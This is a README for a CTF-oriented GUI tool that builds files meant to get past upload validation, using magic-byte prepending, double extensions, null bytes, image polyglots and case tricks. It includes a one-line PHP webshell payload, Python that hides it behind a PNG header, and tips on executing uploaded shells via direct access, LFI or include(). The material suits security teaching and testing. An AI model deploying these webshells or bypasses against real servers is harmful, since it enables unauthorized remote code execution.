# 0days | File Upload Bypass Toolkit

<div align="center">

![Version](https://img.shields.io/badge/version-1.0.0-9d4edd)
![Python](https://img.shields.io/badge/python-3.7+-7b2cbf)
![License](https://img.shields.io/badge/license-MIT-e0aaff)
![CTF](https://img.shields.io/badge/CTF-Tool-c77dff)

**A powerful, aesthetic GUI tool for file upload bypass techniques in CTF competitions**

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Techniques](#techniques) • [Screenshots](#screenshots) • [Legal](#legal)

</div>

---

## 🎯 Overview

**0days** is a comprehensive Python-based GUI toolkit designed for CTF (Capture The Flag) competitions and security research. It provides an intuitive interface for testing and exploiting common file upload vulnerabilities using multiple bypass techniques.

### ✨ Key Features

- 🎨 **Aesthetic Purple UI** - Modern, clean interface with cyberpunk-inspired design
- 🛠️ **4 Bypass Techniques** - Magic bytes, extensions, polyglots, and case manipulation
- 🚀 **Easy to Use** - No command-line needed, fully GUI-based
- 💾 **File Preservation** - Original files remain untouched
- 🎓 **Educational** - Perfect for learning web security concepts

---

## 📦 Installation

### Prerequisites

- Python 3.7 or higher
- tkinter (usually comes with Python)

### Quick Start

1. **Clone the repository**
```bash
git clone https://github.com/yourusername/0days-bypass-tool.git
cd 0days-bypass-tool
```

2. **Run the tool**
```bash
python bypass_tool.py
```

That's it! No external dependencies required.

---

## 🚀 Usage

### Basic Workflow

1. **Launch the application**
```bash
   python bypass_tool.py
```

2. **Select a technique tab** (Magic Bytes, Extensions, Polyglots, or Case Tricks)

3. **Choose or create your bypass payload**

4. **Generate the modified file**

5. **Upload to target CTF challenge**

---

## 🔧 Techniques

### 1. 🎭 Magic Bytes Bypass

Prepends file signature headers to fool MIME type validation.

**Supported Formats:**
- PNG (`\x89PNG\r\n\x1a\n`)
- JPEG (`\xff\xd8\xff\xe0`)
- GIF87a / GIF89a
- PDF (`%PDF-`)
- ZIP / DOCX (`PK\x03\x04`)
- BMP, WebP, ICO

**Use Case:** Bypass filters checking only magic numbers/file signatures

**Example:**
```
Original: shell.php
Modified: shell.php (with PNG header prepended)
Result: Passes as valid PNG to naive validators
```

---

### 2. 📝 Extension Bypass

Manipulates file extensions to exploit weak validation logic.

**Features:**
- **Double Extensions**: `.jpg.php`, `.png.asp`, `.gif.jsp`
- **Custom Extensions**: Create any combination
- **Null Byte Injection**: `.php\x00.jpg` (terminates string parsing)

**Use Case:** Exploit servers that only check the last extension or mishandle null bytes

**Example:**
```
Original: payload.php
Modified: payload.jpg.php
Result: Appears as .jpg to weak filters, executed as .php
```

---

### 3. 🖼️ Polyglot Files

Creates valid image files with embedded executable payloads.

**Supported Image Types:**
- GIF (GIF89a header)
- JPEG (JFIF format)
- PNG (PNG signature)

**Default Payload:**
```php
<?php system($_GET['cmd']); ?>
```

**Use Case:** Bypass strict image validators while maintaining code execution

**Example:**
```
File: polyglot.gif
- Renders as valid GIF image
- Contains PHP webshell
- Executes when accessed with .php extension or inclusion
```

---

### 4. 🔤 Case Manipulation

Alters file extension capitalization to evade blacklists.

**Patterns:**
- Uppercase: `.PHP`
- Lowercase: `.php`
- Mixed Case: `.pHp`, `.PhP`, `.PHp`
- Double Extension: `.php.PHP`
- Alternating Case: `.pHp`

**Use Case:** Bypass case-sensitive blacklists or whitelist validation

**Example:**
```
Blocked: shell.php
Allowed: shell.pHp (case-sensitive filter bypass)
```

---

## 🎨 Screenshots

### Main Interface
```
┌─────────────────────────────────────────┐
│           0days                         │
│    FILE UPLOAD BYPASS TOOLKIT          │
├─────────────────────────────────────────┤
│ [MAGIC BYTES] [EXTENSIONS] [POLYGLOTS] │
│                                         │
│  SELECT FILE: shell.php                │
│                                         │
│  ┌───────────────────────────────────┐ │
│  │  PNG                              │ │
│  │  JPEG                             │ │
│  │  GIF87a                           │ │
│  └───────────────────────────────────┘ │
│                                         │
│  [GENERATE BYPASS FILE]                │
└─────────────────────────────────────────┘
```

---

## 🛡️ Bypass Techniques Explained

### Magic Number/File Signature Bypass

**How it works:**
Many applications validate uploaded files by checking the first few bytes (magic numbers). By prepending a valid magic number to your payload, you can trick the validator.
```python
# Original file
file_content = b"<?php system($_GET['cmd']); ?>"

# After magic byte prepend
modified = b"\x89PNG\r\n\x1a\n" + file_content

# Server thinks: "It's a PNG!" ✓
# Reality: Contains PHP code ✗
```

---

### Double Extension Bypass

**How it works:**
Exploits poor extension parsing in upload filters.
```
Example scenarios:

1. Server checks: endsWith(".jpg") → TRUE
   Server saves as: file.jpg.php → EXECUTED

2. Null byte: "file.php\x00.jpg"
   Filter sees: .jpg ✓
   Server processes: file.php (null terminates string)

3. Case bypass: "file.PhP"
   Blacklist has: [".php", ".asp"]
   Mixed case: bypasses lowercase-only checks
```

---

### Polyglot File Creation

**How it works:**
Creates files that are valid in multiple formats simultaneously.
```
GIF Structure:
┌──────────────┐
│ GIF89a       │ ← Valid GIF header
├──────────────┤
│ 1x1 pixel    │ ← Minimal valid GIF data
├──────────────┤
│ <?php ... ?> │ ← Your payload
└──────────────┘

Result:
- Image viewers: Display 1x1 GIF ✓
- PHP interpreter: Execute code ✓
```

---

## 📚 CTF Use Cases

### Scenario 1: Content-Type Validation
```
Challenge: Upload only allows image/png MIME type
Solution: Use Magic Bytes tab → prepend PNG signature
Result: Passes MIME check, execute via LFI/RCE
```

### Scenario 2: Extension Blacklist
```
Challenge: .php, .asp, .jsp extensions blocked
Solution: Use Extensions tab → try .pHp, .php5, .phtml
Result: Bypass case-sensitive or incomplete blacklist
```

### Scenario 3: Image Upload with Execution
```
Challenge: Must be valid image + get code execution
Solution: Use Polyglots tab → embed PHP in GIF
Result: Pass image validation + execute via include()
```

### Scenario 4: Whitelist Bypass
```
Challenge: Only .jpg, .png, .gif allowed
Solution: Use Extensions tab → upload shell.php.jpg
Result: If server misconfigures, may execute as PHP
```

---

## ⚙️ Advanced Tips

### Combining Techniques

For maximum effectiveness, combine multiple bypass methods:

1. **Magic Bytes + Double Extension**
```
   File: payload.jpg.php
   Content: [PNG_HEADER] + <?php code ?>
```

2. **Polyglot + Case Manipulation**
```
   File: image.GiF
   Content: Valid GIF + embedded shell
```

3. **Null Byte + Magic Number**
```
   File: shell.php\x00.png
   Content: [PNG_HEADER] + PHP code
```

### Testing Methodology

1. **Reconnaissance**
   - Identify allowed extensions
   - Test file type validation (magic vs extension)
   - Check for null byte handling

2. **Exploitation**
   - Start with simple techniques (case manipulation)
   - Escalate to complex (polyglots)
   - Test different extension combinations

3. **Execution**
   - Direct access: `http://target.com/uploads/shell.php`
   - LFI: `?page=uploads/shell.jpg` (if PHP execution enabled)
   - XXE/SSRF: Include uploaded file in XML/request

---

## 🔒 Security & Legal

### ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ CTF competitions
- ✅ Security research in controlled environments
- ✅ Educational demonstrations

**NOT for:**
- ❌ Unauthorized access to systems
- ❌ Malicious activities
- ❌ Illegal hacking

**Users are responsible for ensuring they have permission to test target systems.**

### Ethical Usage Guidelines

1. **Always obtain written authorization** before testing
2. **Use only in CTF/lab environments** unless authorized
3. **Respect scope limitations** of penetration tests
4. **Report vulnerabilities responsibly**
5. **Never use on production systems** without permission

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Adding New Techniques

1. Fork the repository
2. Create a feature branch
```bash
   git checkout -b feature/new-bypass-technique
```
3. Add your technique to the appropriate tab or create a new one
4. Test thoroughly
5. Submit a pull request with:
   - Description of the technique
   - Use cases and examples
   - Any relevant CTF challenges it solves

### Reporting Issues

Found a bug? Have a suggestion? 

- Open an issue with detailed description
- Include Python version and OS
- Provide steps to reproduce

---

## 🗺️ Roadmap

### Planned Features

- [ ] **MIME Type Spoofing** - Advanced content-type manipulation
- [ ] **Zip Slip Generator** - Path traversal in archives
- [ ] **XXE Payloads** - SVG/XML injection templates
- [ ] **Reverse Shell Generator** - Integrated payload creation
- [ ] **Batch Processing** - Process multiple files at once
- [ ] **Template Library** - Pre-made payloads for common scenarios
- [ ] **Export Reports** - Generate documentation of bypass attempts

### Future Enhancements

- Plugin system for custom techniques
- Dark/Light theme toggle
- Command-line interface option
- Web-based version
- Integration with Burp Suite

---

## 📖 Resources

### Learn More About File Upload Vulnerabilities

**OWASP Resources:**
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Testing Guide - File Upload](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)

**CTF Writeups:**
- HackTheBox: Upload Bypass Challenges
- PicoCTF: Web Exploitation
- OverTheWire: Natas Series

**Research Papers:**
- "A Systematic Analysis of File Upload Vulnerabilities"
- "Polyglot Files: Breaking Content-Type Validation"

---

## 🏆 Credits

**Developed by:** Jackson Mittag | 0days

**Inspired by:**
- Real-world CTF challenges
- OWASP security research
- Security community contributions

**Special Thanks:**
- CTF community for inspiration
- Security researchers for bypass techniques
- Python/tkinter developers

---

## 📄 License
```
MIT License

Copyright (c) 2024 0days Project

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 💬 Contact & Support

- **GitHub Issues:** [Report bugs or request features](https://github.com/theemperorspath/0days-bypass-tool/issues)
- **Email:** theemperorspath@protonmail.com
---

<div align="center">

**⭐ Star this repo if you find it useful! ⭐**

Made with 💜 for the CTF community

[Back to Top](#0days--file-upload-bypass-toolkit)

</div>
